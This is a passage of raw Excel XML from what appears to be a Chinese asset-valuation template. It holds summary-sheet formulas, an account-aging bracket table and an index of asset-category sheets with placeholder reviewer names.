        <f>IF('1-汇总表'!E30="","",ROUND('1-汇总表'!E30,2))</f>
        <v/>
      </c>
      <c r="D22" s="530">
        <f>IF('1-汇总表'!F30="","",ROUND('1-汇总表'!F30,2))</f>
        <v/>
      </c>
      <c r="E22" s="530">
        <f>IF('1-汇总表'!G30="","",ROUND('1-汇总表'!G30,2))</f>
        <v/>
      </c>
      <c r="F22" s="531">
        <f>IF('1-汇总表'!H30="","",ROUND('1-汇总表'!H30,2))</f>
        <v/>
      </c>
      <c r="I22" s="512" t="inlineStr">
        <is>
          <t>所有者权益(净资产)</t>
        </is>
      </c>
      <c r="J22" s="532" t="n"/>
      <c r="K22" s="533">
        <f>IF('2-分类汇总'!E65="","",ROUND('2-分类汇总'!E65,2))</f>
        <v/>
      </c>
    </row>
    <row r="23" ht="18" customHeight="1" s="415">
      <c r="B23" s="515" t="inlineStr">
        <is>
          <t>所有者权益(净资产)</t>
        </is>
      </c>
      <c r="C23" s="534">
        <f>IF('1-汇总表'!E31="","",ROUND('1-汇总表'!E31,2))</f>
        <v/>
      </c>
      <c r="D23" s="534">
        <f>IF('1-汇总表'!F31="","",ROUND('1-汇总表'!F31,2))</f>
        <v/>
      </c>
      <c r="E23" s="534">
        <f>IF('1-汇总表'!G31="","",ROUND('1-汇总表'!G31,2))</f>
        <v/>
      </c>
      <c r="F23" s="517">
        <f>IF('1-汇总表'!H31="","",ROUND('1-汇总表'!H31,2))</f>
        <v/>
      </c>
    </row>
    <row r="24" ht="18.75" customHeight="1" s="415">
      <c r="I24" s="428" t="inlineStr">
        <is>
          <t>注：非流动资产只列示了常用科目，可根据实际情况增加。</t>
        </is>
      </c>
    </row>
  </sheetData>
  <mergeCells count="1">
    <mergeCell ref="B3:B4"/>
  </mergeCells>
  <pageMargins left="0.700694444444445" right="0.700694444444445" top="0.751388888888889" bottom="0.972222222222222" header="0.298611111111111" footer="0.597222222222222"/>
  <pageSetup orientation="portrait" paperSize="9"/>
  <headerFooter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4:Q19"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="D10" sqref="D10"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="21" customHeight="1"/>
  <cols>
    <col width="15.8333333333333" customWidth="1" style="415" min="14" max="14"/>
    <col width="10.3333333333333" customWidth="1" style="415" min="15" max="15"/>
    <col width="12.6666666666667" customWidth="1" style="415" min="17" max="17"/>
    <col width="10.6666666666667" customWidth="1" style="415" min="21" max="21"/>
  </cols>
  <sheetData>
    <row r="4" s="415">
      <c r="A4" s="480" t="inlineStr">
        <is>
          <t>账龄设置</t>
        </is>
      </c>
      <c r="B4" s="481" t="n"/>
      <c r="C4" s="481" t="n"/>
      <c r="D4" s="481" t="n"/>
      <c r="E4" s="481" t="n"/>
      <c r="F4" s="481" t="n"/>
      <c r="G4" s="481" t="n"/>
      <c r="H4" s="481" t="n"/>
      <c r="I4" s="481" t="n"/>
      <c r="J4" s="481" t="n"/>
    </row>
    <row r="5" s="415">
      <c r="B5" s="428" t="inlineStr">
        <is>
          <t>账龄</t>
        </is>
      </c>
      <c r="C5" t="inlineStr">
        <is>
          <t>D值</t>
        </is>
      </c>
    </row>
    <row r="6" s="415">
      <c r="C6" s="482" t="inlineStr">
        <is>
          <t>下限</t>
        </is>
      </c>
      <c r="D6" s="482" t="inlineStr">
        <is>
          <t>上限</t>
        </is>
      </c>
      <c r="G6" s="428" t="inlineStr">
        <is>
          <t>D=（评估基准日-发生日期）/365</t>
        </is>
      </c>
    </row>
    <row r="7" s="415">
      <c r="B7" t="inlineStr">
        <is>
          <t>1年以内</t>
        </is>
      </c>
      <c r="C7" t="n">
        <v>0</v>
      </c>
      <c r="D7" t="n">
        <v>1</v>
      </c>
    </row>
    <row r="8" s="415">
      <c r="B8" t="inlineStr">
        <is>
          <t>1～2年</t>
        </is>
      </c>
      <c r="C8" t="n">
        <v>1</v>
      </c>
      <c r="D8" t="n">
        <v>2</v>
      </c>
    </row>
    <row r="9" s="415">
      <c r="B9" t="inlineStr">
        <is>
          <t>2～3年</t>
        </is>
      </c>
      <c r="C9" t="n">
        <v>2</v>
      </c>
      <c r="D9" t="n">
        <v>3</v>
      </c>
    </row>
    <row r="10" s="415">
      <c r="B10" t="inlineStr">
        <is>
          <t>3年以上</t>
        </is>
      </c>
      <c r="C10" t="n">
        <v>3</v>
      </c>
    </row>
    <row r="11" s="415">
      <c r="N11" s="483" t="n"/>
      <c r="O11" s="483" t="n"/>
      <c r="Q11" s="535" t="n"/>
    </row>
    <row r="12" s="415">
      <c r="A12" s="484" t="n"/>
      <c r="B12" s="484" t="n"/>
      <c r="C12" s="484" t="n"/>
      <c r="D12" s="484" t="n"/>
      <c r="E12" s="484" t="n"/>
      <c r="F12" s="484" t="n"/>
      <c r="G12" s="484" t="n"/>
      <c r="H12" s="484" t="n"/>
      <c r="I12" s="484" t="n"/>
      <c r="J12" s="484" t="n"/>
      <c r="N12" s="483" t="n"/>
      <c r="O12" s="483" t="n"/>
      <c r="Q12" s="535" t="n"/>
    </row>
    <row r="13" s="415">
      <c r="N13" s="483" t="n"/>
      <c r="O13" s="483" t="n"/>
      <c r="Q13" s="535" t="n"/>
    </row>
    <row r="14" s="415">
      <c r="N14" s="483" t="n"/>
      <c r="O14" s="483" t="n"/>
      <c r="Q14" s="535" t="n"/>
    </row>
    <row r="15" s="415">
      <c r="N15" s="483" t="n"/>
      <c r="O15" s="483" t="n"/>
      <c r="Q15" s="535" t="n"/>
    </row>
    <row r="16" s="415">
      <c r="N16" s="483" t="n"/>
      <c r="O16" s="483" t="n"/>
      <c r="Q16" s="535" t="n"/>
    </row>
    <row r="17" s="415">
      <c r="N17" s="483" t="n"/>
      <c r="O17" s="483" t="n"/>
      <c r="Q17" s="535" t="n"/>
    </row>
    <row r="18" s="415">
      <c r="N18" s="483" t="n"/>
      <c r="O18" s="483" t="n"/>
      <c r="Q18" s="535" t="n"/>
    </row>
    <row r="19" s="415">
      <c r="N19" s="483" t="n"/>
      <c r="O19" s="483" t="n"/>
      <c r="Q19" s="535" t="n"/>
    </row>
  </sheetData>
  <pageMargins left="0.75" right="0.75" top="1" bottom="0.972222222222222" header="0.5" footer="0.597222222222222"/>
  <pageSetup orientation="portrait" paperSize="9"/>
  <headerFooter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109">
    <tabColor rgb="FFFF0000"/>
    <outlinePr summaryBelow="0"/>
    <pageSetUpPr/>
  </sheetPr>
  <dimension ref="A2:K119"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="E12" sqref="E12"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="39.6666666666667" defaultRowHeight="17.6"/>
  <cols>
    <col width="8.16666666666667" customWidth="1" style="458" min="1" max="1"/>
    <col width="14" customWidth="1" style="458" min="2" max="2"/>
    <col width="31.8333333333333" customWidth="1" style="415" min="3" max="3"/>
    <col width="35.6666666666667" customWidth="1" style="415" min="4" max="4"/>
    <col width="39.6666666666667" customWidth="1" style="415" min="5" max="5"/>
  </cols>
  <sheetData>
    <row r="2">
      <c r="D2" s="459" t="inlineStr">
        <is>
          <t>左页脚信息</t>
        </is>
      </c>
      <c r="G2" s="435" t="n"/>
    </row>
    <row r="3">
      <c r="C3" s="68">
        <f>设定信息!$A$6&amp;"填表人："</f>
        <v/>
      </c>
      <c r="D3" s="432" t="inlineStr">
        <is>
          <t>张三</t>
        </is>
      </c>
      <c r="G3" s="435" t="n"/>
    </row>
    <row r="4">
      <c r="C4" s="68" t="inlineStr">
        <is>
          <t>填表日期：</t>
        </is>
      </c>
      <c r="D4" s="536" t="n">
        <v>44617</v>
      </c>
      <c r="G4" s="435" t="n"/>
    </row>
    <row r="5">
      <c r="G5" s="435" t="n"/>
    </row>
    <row r="6">
      <c r="G6" s="436" t="n"/>
    </row>
    <row r="7">
      <c r="D7" s="459" t="inlineStr">
        <is>
          <t>右页脚信息</t>
        </is>
      </c>
    </row>
    <row r="8">
      <c r="A8" s="460" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="B8" s="460" t="inlineStr">
        <is>
          <t>选定</t>
        </is>
      </c>
      <c r="C8" s="461" t="inlineStr">
        <is>
          <t>表页名称</t>
        </is>
      </c>
      <c r="D8" s="462" t="inlineStr">
        <is>
          <t>评估专业人员姓名</t>
        </is>
      </c>
      <c r="E8" s="463" t="n"/>
      <c r="F8" s="463" t="n"/>
    </row>
    <row r="9">
      <c r="A9" s="464" t="inlineStr">
        <is>
          <t>1</t>
        </is>
      </c>
      <c r="B9" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C9" s="466" t="inlineStr">
        <is>
          <t>1-汇总表</t>
        </is>
      </c>
      <c r="D9" s="467" t="n"/>
      <c r="E9" s="463" t="n"/>
      <c r="F9" s="463" t="n"/>
    </row>
    <row r="10">
      <c r="A10" s="464" t="inlineStr">
        <is>
          <t>2</t>
        </is>
      </c>
      <c r="B10" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C10" s="466" t="inlineStr">
        <is>
          <t>2-分类汇总</t>
        </is>
      </c>
      <c r="D10" s="467" t="n"/>
      <c r="E10" s="463" t="n"/>
      <c r="F10" s="463" t="n"/>
    </row>
    <row r="11">
      <c r="A11" s="464" t="inlineStr">
        <is>
          <t>3</t>
        </is>
      </c>
      <c r="B11" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C11" s="468" t="inlineStr">
        <is>
          <t>3-流动资产汇总</t>
        </is>
      </c>
      <c r="D11" s="467" t="n"/>
      <c r="E11" s="463" t="n"/>
      <c r="F11" s="463" t="n"/>
    </row>
    <row r="12" outlineLevel="1" s="415">
      <c r="A12" s="464" t="inlineStr">
        <is>
          <t>3-1</t>
        </is>
      </c>
      <c r="B12" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C12" s="469" t="inlineStr">
        <is>
          <t>3-1货币资金汇总表</t>
        </is>
      </c>
      <c r="D12" s="467" t="n"/>
      <c r="E12" s="463" t="n"/>
      <c r="F12" s="463" t="n"/>
    </row>
    <row r="13" outlineLevel="2" s="415">
      <c r="A13" s="470" t="inlineStr">
        <is>
          <t>3-1-1</t>
        </is>
      </c>
      <c r="B13" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C13" s="471" t="inlineStr">
        <is>
          <t>3-1-1现金</t>
        </is>
      </c>
      <c r="D13" s="467" t="n"/>
      <c r="E13" s="463" t="n"/>
      <c r="F13" s="463" t="n"/>
    </row>
    <row r="14" outlineLevel="2" s="415">
      <c r="A14" s="470" t="inlineStr">
        <is>
          <t>3-1-2</t>
        </is>
      </c>
      <c r="B14" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C14" s="472" t="inlineStr">
        <is>
          <t>3-1-2银行存款</t>
        </is>
      </c>
      <c r="D14" s="467" t="n"/>
      <c r="E14" s="473" t="n"/>
      <c r="F14" s="463" t="n"/>
    </row>
    <row r="15" outlineLevel="2" s="415">
      <c r="A15" s="470" t="inlineStr">
        <is>
          <t>3-1-3</t>
        </is>
      </c>
      <c r="B15" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C15" s="471" t="inlineStr">
        <is>
          <t>3-1-3其他货币资金</t>
        </is>
      </c>
      <c r="D15" s="467" t="n"/>
      <c r="E15" s="463" t="n"/>
      <c r="F15" s="463" t="n"/>
    </row>
    <row r="16" outlineLevel="1" s="415">
      <c r="A16" s="464" t="inlineStr">
        <is>
          <t>3-2</t>
        </is>
      </c>
      <c r="B16" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C16" s="474" t="inlineStr">
        <is>
          <t>3-2交易性金融资产汇总</t>
        </is>
      </c>
      <c r="D16" s="467" t="n"/>
      <c r="E16" s="463" t="n"/>
      <c r="F16" s="463" t="n"/>
    </row>
    <row r="17" outlineLevel="2" ht="18" customHeight="1" s="415">
      <c r="A17" s="470" t="inlineStr">
        <is>
          <t>3-2-1</t>
        </is>
      </c>
      <c r="B17" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C17" s="472" t="inlineStr">
        <is>
          <t>3-2-1-股票</t>
        </is>
      </c>
      <c r="D17" s="475" t="inlineStr">
        <is>
          <t>张三 李四</t>
        </is>
      </c>
      <c r="E17" s="463" t="n"/>
      <c r="F17" s="463" t="n"/>
    </row>
    <row r="18" outlineLevel="2" ht="18" customHeight="1" s="415">
      <c r="A18" s="470" t="inlineStr">
        <is>
          <t>3-2-2</t>
        </is>
      </c>
      <c r="B18" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C18" s="471" t="inlineStr">
        <is>
          <t>3-2-2-债券</t>
        </is>
      </c>
      <c r="D18" s="475" t="inlineStr">
        <is>
          <t>张三 李四</t>
        </is>
      </c>
      <c r="E18" s="463" t="n"/>
      <c r="F18" s="463" t="n"/>
    </row>
    <row r="19" outlineLevel="2" ht="18" customHeight="1" s="415">
      <c r="A19" s="470" t="inlineStr">
        <is>
          <t>3-2-3</t>
        </is>
      </c>
      <c r="B19" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C19" s="471" t="inlineStr">
        <is>
          <t>3-2-3-基金</t>
        </is>
      </c>
      <c r="D19" s="475" t="inlineStr">
        <is>
          <t>张三 李四</t>
        </is>
      </c>
      <c r="E19" s="463" t="n"/>
      <c r="F19" s="463" t="n"/>
    </row>
    <row r="20" outlineLevel="1" ht="18" customHeight="1" s="415">
      <c r="A20" s="470" t="inlineStr">
        <is>
          <t>3-3</t>
        </is>
      </c>
      <c r="B20" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C20" s="476" t="inlineStr">
        <is>
          <t>3-3衍生金融资产</t>
        </is>
      </c>
      <c r="D20" s="475" t="inlineStr">
        <is>
          <t>张三 李四</t>
        </is>
      </c>
      <c r="E20" s="463" t="n"/>
      <c r="F20" s="463" t="n"/>
    </row>
    <row r="21" outlineLevel="1" ht="18" customHeight="1" s="415">
      <c r="A21" s="470" t="inlineStr">
        <is>
          <t>3-4</t>
        </is>
      </c>
      <c r="B21" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C21" s="477" t="inlineStr">
        <is>
          <t>3-4应收票据</t>
        </is>
      </c>
      <c r="D21" s="475" t="inlineStr">
        <is>
          <t>张三 李四</t>
        </is>
      </c>
      <c r="E21" s="463" t="n"/>
      <c r="F21" s="463" t="n"/>
    </row>
    <row r="22" outlineLevel="1" ht="18" customHeight="1" s="415">
      <c r="A22" s="470" t="inlineStr">
        <is>
          <t>3-5</t>
        </is>
      </c>
      <c r="B22" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C22" s="476" t="inlineStr">
        <is>
          <t>3-5应收账款</t>
        </is>
      </c>
      <c r="D22" s="475" t="inlineStr">
        <is>
          <t>张三 李四</t>
        </is>
      </c>
      <c r="E22" s="463" t="n"/>
      <c r="F22" s="463" t="n"/>
    </row>
    <row r="23" outlineLevel="1" ht="18" customHeight="1" s="415">
      <c r="A23" s="470" t="inlineStr">
        <is>
          <t>3-6</t>
        </is>
      </c>
      <c r="B23" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C23" s="476" t="inlineStr">
        <is>
          <t>3-6应收款项融资</t>
        </is>
      </c>
      <c r="D23" s="475" t="inlineStr">
        <is>
          <t>张三 李四</t>
        </is>
      </c>
      <c r="E23" s="463" t="n"/>
      <c r="F23" s="463" t="n"/>
    </row>
    <row r="24" outlineLevel="1" ht="18" customHeight="1" s="415">
      <c r="A24" s="470" t="inlineStr">
        <is>
          <t>3-7</t>
        </is>
      </c>
      <c r="B24" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C24" s="476" t="inlineStr">
        <is>
          <t>3-7预付款项</t>
        </is>
      </c>
      <c r="D24" s="475" t="inlineStr">
        <is>
          <t>张三 李四</t>
        </is>
      </c>
      <c r="E24" s="463" t="n"/>
      <c r="F24" s="463" t="n"/>
    </row>
    <row r="25" outlineLevel="1" ht="18" customHeight="1" s="415">
      <c r="A25" s="464" t="inlineStr">
        <is>
          <t>3-8</t>
        </is>
      </c>
      <c r="B25" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C25" s="474" t="inlineStr">
        <is>
          <t>3-8其他应收款汇总</t>
        </is>
      </c>
      <c r="D25" s="475" t="inlineStr">
        <is>
          <t>张三 李四</t>
        </is>
      </c>
      <c r="E25" s="463" t="n"/>
      <c r="F25" s="463" t="n"/>
    </row>
    <row r="26" outlineLevel="2" ht="18" customHeight="1" s="415">
      <c r="A26" s="470" t="inlineStr">
        <is>
          <t>3-8-1</t>
        </is>
      </c>
      <c r="B26" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C26" s="471" t="inlineStr">
        <is>
          <t>3-8-1应收利息</t>
        </is>
      </c>
      <c r="D26" s="475" t="inlineStr">
        <is>
          <t>张三 李四</t>
        </is>
      </c>
      <c r="E26" s="463" t="n"/>
      <c r="F26" s="463" t="n"/>
    </row>
    <row r="27" outlineLevel="2" ht="18" customHeight="1" s="415">
      <c r="A27" s="470" t="inlineStr">
        <is>
          <t>3-8-2</t>
        </is>
      </c>
      <c r="B27" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C27" s="471" t="inlineStr">
        <is>
          <t>3-8-2应收股利</t>
        </is>
      </c>
      <c r="D27" s="475" t="inlineStr">
        <is>
          <t>张三 李四</t>
        </is>
      </c>
      <c r="E27" s="463" t="n"/>
      <c r="F27" s="463" t="n"/>
    </row>
    <row r="28" outlineLevel="2" ht="18" customHeight="1" s="415">
      <c r="A28" s="470" t="inlineStr">
        <is>
          <t>3-8-3</t>
        </is>
      </c>
      <c r="B28" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C28" s="471" t="inlineStr">
        <is>
          <t>3-8-3其他应收款</t>
        </is>
      </c>
      <c r="D28" s="475" t="inlineStr">
        <is>
          <t>张三 李四</t>
        </is>
      </c>
      <c r="E28" s="463" t="n"/>
      <c r="F28" s="463" t="n"/>
    </row>
    <row r="29" outlineLevel="1" ht="18" customHeight="1" s="415">
      <c r="A29" s="464" t="inlineStr">
        <is>
          <t>3-9</t>
        </is>
      </c>
      <c r="B29" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C29" s="474" t="inlineStr">
        <is>
          <t>3-9存货汇总</t>
        </is>
      </c>
      <c r="D29" s="475" t="inlineStr">
        <is>
          <t>张三 李四</t>
        </is>
      </c>
      <c r="E29" s="463" t="n"/>
      <c r="F29" s="463" t="n"/>
    </row>
    <row r="30" outlineLevel="2" ht="18" customHeight="1" s="415">
      <c r="A30" s="470" t="inlineStr">
        <is>
          <t>3-9-1</t>
        </is>
      </c>
      <c r="B30" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C30" s="471" t="inlineStr">
        <is>
          <t>3-9-1在途物资</t>
        </is>
      </c>
      <c r="D30" s="475" t="inlineStr">
        <is>
          <t>张三 李四</t>
        </is>
      </c>
      <c r="E30" s="463" t="n"/>
      <c r="F30" s="463" t="n"/>
    </row>
    <row r="31" outlineLevel="2" ht="18" customHeight="1" s="415">
      <c r="A31" s="470" t="inlineStr">
        <is>
          <t>3-9-2</t>
        </is>
      </c>
      <c r="B31" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C31" s="471" t="inlineStr">
        <is>
          <t>3-9-2原材料</t>
        </is>
      </c>
      <c r="D31" s="475" t="inlineStr">
        <is>
          <t>张三 李四</t>
        </is>
      </c>
      <c r="E31" s="463" t="n"/>
      <c r="F31" s="463" t="n"/>
    </row>
    <row r="32" outlineLevel="2" ht="18" customHeight="1" s="415">
      <c r="A32" s="470" t="inlineStr">
        <is>
          <t>3-9-3</t>
        </is>
      </c>
      <c r="B32" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C32" s="471" t="inlineStr">
        <is>
          <t>3-9-3在库周转材料</t>
        </is>
      </c>
      <c r="D32" s="475" t="inlineStr">
        <is>
          <t>张三 李四</t>
        </is>
      </c>
      <c r="E32" s="463" t="n"/>
      <c r="F32" s="463" t="n"/>
    </row>
    <row r="33" outlineLevel="2" ht="18" customHeight="1" s="415">
      <c r="A33" s="470" t="inlineStr">
        <is>
          <t>3-9-4</t>
        </is>
      </c>
      <c r="B33" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C33" s="471" t="inlineStr">
        <is>
          <t>3-9-4委托加工物资</t>
        </is>
      </c>
      <c r="D33" s="475" t="inlineStr">
        <is>
          <t>张三 李四</t>
        </is>
      </c>
      <c r="E33" s="463" t="n"/>
      <c r="F33" s="463" t="n"/>
    </row>
    <row r="34" outlineLevel="2" ht="18" customHeight="1" s="415">
      <c r="A34" s="470" t="inlineStr">
        <is>
          <t>3-9-5</t>
        </is>
      </c>
      <c r="B34" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C34" s="471" t="inlineStr">
        <is>
          <t>3-9-5产成品（库存商品）</t>
        </is>
      </c>
      <c r="D34" s="475" t="inlineStr">
        <is>
          <t>张三 李四</t>
        </is>
      </c>
      <c r="E34" s="463" t="n"/>
      <c r="F34" s="463" t="n"/>
    </row>
    <row r="35" outlineLevel="2" ht="18" customHeight="1" s="415">
      <c r="A35" s="470" t="inlineStr">
        <is>
          <t>3-9-6</t>
        </is>
      </c>
      <c r="B35" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C35" s="471" t="inlineStr">
        <is>
          <t>3-9-6在产品（自制半成品）</t>
        </is>
      </c>
      <c r="D35" s="475" t="inlineStr">
        <is>
          <t>张三 李四</t>
        </is>
      </c>
      <c r="E35" s="463" t="n"/>
      <c r="F35" s="463" t="n"/>
    </row>
    <row r="36" outlineLevel="2" s="415">
      <c r="A36" s="470" t="inlineStr">
        <is>
          <t>3-9-7</t>
        </is>
      </c>
      <c r="B36" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C36" s="471" t="inlineStr">
        <is>
          <t>3-9-7发出商品</t>
        </is>
      </c>
      <c r="D36" s="467" t="n"/>
      <c r="E36" s="463" t="n"/>
      <c r="F36" s="463" t="n"/>
    </row>
    <row r="37" outlineLevel="2" s="415">
      <c r="A37" s="470" t="inlineStr">
        <is>
          <t>3-9-8</t>
        </is>
      </c>
      <c r="B37" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C37" s="471" t="inlineStr">
        <is>
          <t>3-9-8在用周转材料</t>
        </is>
      </c>
      <c r="D37" s="467" t="n"/>
      <c r="E37" s="463" t="n"/>
      <c r="F37" s="463" t="n"/>
    </row>
    <row r="38" outlineLevel="2" s="415">
      <c r="A38" s="470" t="inlineStr">
        <is>
          <t>3-9-9</t>
        </is>
      </c>
      <c r="B38" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C38" s="471" t="inlineStr">
        <is>
          <t>3-9-9合同履约成本</t>
        </is>
      </c>
      <c r="D38" s="467" t="n"/>
      <c r="E38" s="463" t="n"/>
      <c r="F38" s="463" t="n"/>
    </row>
    <row r="39" outlineLevel="1" s="415">
      <c r="A39" s="470" t="inlineStr">
        <is>
          <t>3-10</t>
        </is>
      </c>
      <c r="B39" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C39" s="476" t="inlineStr">
        <is>
          <t>3-10合同资产</t>
        </is>
      </c>
      <c r="D39" s="467" t="n"/>
      <c r="E39" s="463" t="n"/>
      <c r="F39" s="463" t="n"/>
    </row>
    <row r="40" outlineLevel="1" s="415">
      <c r="A40" s="470" t="inlineStr">
        <is>
          <t>3-11</t>
        </is>
      </c>
      <c r="B40" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C40" s="476" t="inlineStr">
        <is>
          <t>3-11持有待售资产</t>
        </is>
      </c>
      <c r="D40" s="467" t="n"/>
      <c r="E40" s="463" t="n"/>
      <c r="F40" s="463" t="n"/>
    </row>
    <row r="41" outlineLevel="1" s="415">
      <c r="A41" s="470" t="inlineStr">
        <is>
          <t>3-12</t>
        </is>
      </c>
      <c r="B41" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C41" s="476" t="inlineStr">
        <is>
          <t>3-12一年到期非流动资产</t>
        </is>
      </c>
      <c r="D41" s="467" t="n"/>
      <c r="E41" s="463" t="n"/>
      <c r="F41" s="463" t="n"/>
    </row>
    <row r="42" outlineLevel="1" s="415">
      <c r="A42" s="470" t="inlineStr">
        <is>
          <t>3-13</t>
        </is>
      </c>
      <c r="B42" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C42" s="476" t="inlineStr">
        <is>
          <t>3-13其他流动资产</t>
        </is>
      </c>
      <c r="D42" s="467" t="n"/>
      <c r="E42" s="463" t="n"/>
      <c r="F42" s="463" t="n"/>
    </row>
    <row r="43">
      <c r="A43" s="464" t="inlineStr">
        <is>
          <t>4</t>
        </is>
      </c>
      <c r="B43" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C43" s="466" t="inlineStr">
        <is>
          <t>4-非流动资产汇总</t>
        </is>
      </c>
      <c r="D43" s="467" t="n"/>
      <c r="E43" s="463" t="n"/>
      <c r="F43" s="463" t="n"/>
    </row>
    <row r="44" outlineLevel="1" s="415">
      <c r="A44" s="470" t="inlineStr">
        <is>
          <t>4-1</t>
        </is>
      </c>
      <c r="B44" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C44" s="476" t="inlineStr">
        <is>
          <t>4-1债权投资</t>
        </is>
      </c>
      <c r="D44" s="467" t="n"/>
      <c r="E44" s="463" t="n"/>
      <c r="F44" s="463" t="n"/>
    </row>
    <row r="45" outlineLevel="1" s="415">
      <c r="A45" s="470" t="inlineStr">
        <is>
          <t>4-2</t>
        </is>
      </c>
      <c r="B45" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C45" s="476" t="inlineStr">
        <is>
          <t>4-2其他债权投资</t>
        </is>
      </c>
      <c r="D45" s="467" t="n"/>
      <c r="E45" s="463" t="n"/>
      <c r="F45" s="463" t="n"/>
    </row>
    <row r="46" outlineLevel="1" s="415">
      <c r="A46" s="470" t="inlineStr">
        <is>
          <t>4-3</t>
        </is>
      </c>
      <c r="B46" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C46" s="476" t="inlineStr">
        <is>
          <t>4-3长期应收</t>
        </is>
      </c>
      <c r="D46" s="467" t="n"/>
      <c r="E46" s="463" t="n"/>
      <c r="F46" s="463" t="n"/>
    </row>
    <row r="47" outlineLevel="1" s="415">
      <c r="A47" s="470" t="inlineStr">
        <is>
          <t>4-4</t>
        </is>
      </c>
      <c r="B47" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C47" s="476" t="inlineStr">
        <is>
          <t>4-4股权投资</t>
        </is>
      </c>
      <c r="D47" s="467" t="n"/>
      <c r="E47" s="463" t="n"/>
      <c r="F47" s="463" t="n"/>
    </row>
    <row r="48" outlineLevel="1" s="415">
      <c r="A48" s="470" t="inlineStr">
        <is>
          <t>4-5</t>
        </is>
      </c>
      <c r="B48" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C48" s="476" t="inlineStr">
        <is>
          <t>4-5其他权益工具投资</t>
        </is>
      </c>
      <c r="D48" s="467" t="n"/>
      <c r="E48" s="463" t="n"/>
      <c r="F48" s="463" t="n"/>
    </row>
    <row r="49" outlineLevel="1" s="415">
      <c r="A49" s="470" t="inlineStr">
        <is>
          <t>4-6</t>
        </is>
      </c>
      <c r="B49" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C49" s="476" t="inlineStr">
        <is>
          <t>4-6其他非流动金融资产</t>
        </is>
      </c>
      <c r="D49" s="467" t="n"/>
      <c r="E49" s="463" t="n"/>
      <c r="F49" s="463" t="n"/>
    </row>
    <row r="50" outlineLevel="2" s="415">
      <c r="A50" s="470" t="inlineStr">
        <is>
          <t>4-6-1</t>
        </is>
      </c>
      <c r="B50" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C50" s="471" t="inlineStr">
        <is>
          <t>4-6-1-股票</t>
        </is>
      </c>
      <c r="D50" s="467" t="n"/>
      <c r="E50" s="463" t="n"/>
      <c r="F50" s="463" t="n"/>
    </row>
    <row r="51" outlineLevel="2" s="415">
      <c r="A51" s="470" t="inlineStr">
        <is>
          <t>4-6-2</t>
        </is>
      </c>
      <c r="B51" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
      <c r="C51" s="471" t="inlineStr">
        <is>
          <t>4-6-2-债券</t>
        </is>
      </c>
      <c r="D51" s="467" t="n"/>
      <c r="E51" s="463" t="n"/>
      <c r="F51" s="463" t="n"/>
    </row>
    <row r="52" outlineLevel="2" s="415">
      <c r="A52" s="470" t="inlineStr">
        <is>
          <t>4-6-3</t>
        </is>
      </c>
      <c r="B52" s="465" t="inlineStr">
        <is>
          <t>√</t>
        </is>
      </c>
